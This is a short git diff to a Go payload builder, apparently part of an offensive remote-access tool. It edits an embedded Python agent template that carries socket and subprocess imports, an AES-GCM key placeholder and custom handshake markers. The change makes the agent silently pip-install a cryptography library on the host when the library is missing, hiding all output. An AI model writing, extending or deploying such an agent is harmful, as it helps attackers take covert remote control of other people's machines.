@@ -260,7 +260,13 @@ func Build(lhost, lport, webPort string) map[string][]Entry {
 
 // agentTemplate is the encrypted Python agent source, with placeholders.
 const agentTemplate = `import socket,subprocess,sys,os,struct
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+try:
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+except ImportError:
+    import subprocess as _sp
+    _sp.run([sys.executable,'-m','pip','install','cryptography','-q'],
+            stdout=_sp.DEVNULL,stderr=_sp.DEVNULL)
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 KEY=bytes.fromhex('KEY_HEX')
 AUTH=b'HATURAYA_AUTH_v1'
 OK=b'HATURAYA_OK_v1'
